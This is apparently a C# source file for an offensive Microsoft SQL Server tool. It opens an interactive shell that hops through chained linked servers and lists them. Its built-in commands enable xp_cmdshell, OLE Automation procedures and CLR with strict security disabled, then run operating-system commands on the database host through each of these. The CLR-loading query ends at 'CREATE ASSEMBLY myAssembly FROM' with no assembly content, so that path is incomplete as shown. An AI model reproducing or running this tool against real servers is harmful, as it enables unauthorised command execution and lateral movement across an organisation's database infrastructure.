using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using CommandLine;

namespace mssql_exploit
{
    /*
     * Github mark: 1e0hTvn6xERUCF8
     * MsSql basic command line application. Works well with linked servers, builtin commands, codexec.
     */
    public class Options
    {
        [Option('s', "server", Required = true, HelpText = "Server to connect to")]
        public IEnumerable<string> Server { get; set; }

        [Option('d', "database", Required = true, HelpText = "Database to use")]
        public IEnumerable<string> Db { get; set; }

        [Option('u', "username", Required = false, HelpText = "Username")]
        public IEnumerable<string> Username { get; set; }

        [Option('p', "password", Required = false, HelpText = "Password")]
        public IEnumerable<string> Password { get; set; }
    }

    [Verb("enumLinked", HelpText = "Enum linked servers.")]
    public class EnumLinkedOptions : Options
    {

    }

    [Verb("cli", HelpText = "Boi")]
    public class CliOptions: Options
    {

    }


    class mssql_exploit
    {
        static SqlConnection connect(Options o)
        {
            String conString = $"Server = {o.Server.First()}; Database = {o.Db.First()};";
            if (o.Username.ToArray().Length != 0)
            {
                if (o.Password.ToArray().Length == 0)
                {
                    throw new ArgumentException("Password not provided.");
                }
                conString += $"User ID = {o.Username.First()}; Password = {o.Password.First()}; Integrated Security = False;";
            } else
            {
                conString += "Integrated Security = True;";
            }
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("INFO: Auth success!");
            }
            catch
            {
                throw new ArgumentException("Authentication failed!");
            }

            return con;
        }

        static int RunEnumLinked(EnumLinkedOptions o)
        {
            SqlConnection con = connect(o);
            cliSql(con, "EXEC sp_linkedservers;");
            return 0;
        }

        static string getLinkedServerCommand(string command, List<string> linkStack)
        {
            // EXEC (' EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01 ') AT DC01;
            // EXEC('  ') AT <linkname> 
            string result = command;
            
            for (int i = linkStack.Count - 1; i >= 0; i--)
            {
                string link = linkStack[i];
                result = $"EXEC({Q(result)}) AT {link};";
            }

            return result;
        }

        static string query_create_exec_proc1 =
                @"
                use msdb
                DROP PROCEDURE IF EXISTS dbo.cmdExec; 
                DROP ASSEMBLY IF EXISTS myAssembly; 
		        EXEC sp_configure 'show advanced options',1
		        RECONFIGURE
		        EXEC sp_configure 'clr enabled',1
		        RECONFIGURE
		        EXEC sp_configure 'clr strict security', 0
		        RECONFIGURE

		        CREATE ASSEMBLY myAssembly FROM 
";
        static string query_create_exec_proc2 = @"CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";

        static void RunCliExecSQL(SqlConnection con, string command, List<string> linkStack)
        {
            command = getLinkedServerCommand(command, linkStack);
            try
            {
                cliSql(con, command);
            }
            catch (SqlException e)
            {
                Console.WriteLine($"Error: {e.Message}");
            }
        }
        static int RunCli(CliOptions o)
        {
            SqlConnection con = connect(o);
            string instanceName = execSql(con, "SELECT @@servername")[1][0];
            List<string> linkStack = new List<string>();
            while (true)
            {
                string status = instanceName;
                if (linkStack.Count != 0)
                    status += " -> ";
                status += String.Join(" -> ", linkStack);
                status += "> ";
                Console.Write(status);

                string command = Console.ReadLine();
                if (command == "")
                {
                    continue;
                } else if (command == "!exit")
                    break;
                else if (command == "!help")
                {
                    Console.WriteLine(@"
!help               - Print this message
!exit               - Exit
!execAt <link_name> - Execute on linked server. This can be stacked multiple times. Automatic single quote ' escaping. 
!pop                - Remove the top linked server from the stack.
!!user              - Query current user
!!linked            - Query linked servers
!!enxpcmd           - Enable xp_cmdshell OS code execution
!!xpcmd <command>   - Run OS command via master..xp_cmdshell
!!enspoa            - Enable sp_OACreate os code execution
!!spoa <command>    - Run OS command via sp_OACreate
!!loadExecProc      - Create stored procedure to execute OS commands
!!execProc          - Run OS command via loadExecProc command stored procedure
anything            - Execute SQL query and print result.
");
                    continue;
                }
                else if (command.StartsWith("!execAt"))
                {
                    linkStack.Add(command.Substring(7).Trim());
                    continue;
                }
                else if (command.StartsWith("!pop"))
                {
                    if (linkStack.Count != 0)
                    {
                        linkStack.RemoveAt(linkStack.Count - 1);
                    }
                    continue;
                } else if (command.StartsWith("!!user"))
                {
                    command = "select system_user as 'system_user', suser_name() as 'suser_name', current_user as 'current_user'";
                } else if (command.StartsWith("!!linked"))
                {
                    command = "SELECT * FROM sys.Servers a LEFT OUTER JOIN sys.linked_logins b ON b.server_id = a.server_id LEFT OUTER JOIN sys.server_principals c ON c.principal_id = b.local_principal_id";
                } else if (command.StartsWith("!!enxpcmd"))
                {
                    command = "sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE";
                } else if (command.StartsWith("!!xpcmd"))
                {
                    command = $"master..xp_cmdshell {Q(command.Substring(8))}";
                } else if (command.StartsWith("!!enspoa"))
                {
                    command = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE";
                } else if (command.StartsWith("!!spoa"))
                {
                    command = $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, {Q(command.Substring(7))}";
                } else if (command.StartsWith("!!loadExecProc"))
                {
                    RunCliExecSQL(con, query_create_exec_proc1, linkStack);
                    command = query_create_exec_proc2;
                } else if (command.StartsWith("!!execProc"))
                {
                    command = $"EXEC cmdExec {Q(command.Substring(10))}";
                }

                RunCliExecSQL(con, command, linkStack);
            }
            return 0;
        }

        static int Main(string[] cliArgs)
        {
            try
            {
                return Parser.Default.ParseArguments<EnumLinkedOptions, CliOptions>(cliArgs).MapResult(
                        (EnumLinkedOptions o) => RunEnumLinked(o),
                        (CliOptions o) => RunCli(o),
                        err => 1
                    );
            } catch (ArgumentException e)
            {
                Console.Error.WriteLine($"Error: {e.Message}");
                return 1;
            }
        }

        static List<List<string>> execSql(SqlConnection con, String cmd)
        {
            if (con != null && con.State == ConnectionState.Closed)
            {
                Console.WriteLine("Connection broken, trying to reconnect...");
                con.Open();
            }
            SqlCommand command = new SqlCommand(cmd, con);
            SqlDataReader reader = command.ExecuteReader();
            List<List<string>> result = new List<List<string>>();
            result.Add(new List<string>());
            for (int i = 0; i <reader.FieldCount; ++i)
            {
                result[0].Add(reader.GetName(i));
            }
            while (reader.Read())
            {
                result.Add(new List<string>());
                for (var i = 0; i < reader.FieldCount; ++i)
                {
                    result[result.Count - 1].Add(reader[i].ToString());
                }
            }
            reader.Close();
            return result; 
        }

        static void cliSql(SqlConnection con, String cmd)
        {
            Console.WriteLine("--------------------------------------------------");
            Console.WriteLine(cmd);
            Console.WriteLine("--------------------------------------------------");
            var result = execSql(con, cmd);
            var longest = result[0].Count != 0 ? result[0].Max(r => r.Length) : 0;

            if (result[0].Count == 1) // single column
            {
                Console.WriteLine(result[0][0]);
                Console.WriteLine("---------------");
                for (var i = 1; i < result.Count; ++i)
                {
                    Console.WriteLine(result[i][0]);
                }
            } else { // multiple columns
                for (var i = 1; i < result.Count; ++i)
                {
                    var row = result[i];
                    var colName = result[0];
                    for (var j = 0; j < row.Count; ++j)
                    {
                        Console.WriteLine($"{colName[j]}{new string(' ', longest - colName[j].Length)} -> {row[j]}");
                    }
                    Console.WriteLine("--------------------------------------------------");
                }
            }
        }

        static string Q(string val)
        {
            return "'" + val.Replace("'", "''") + "'";
        }
    }
}
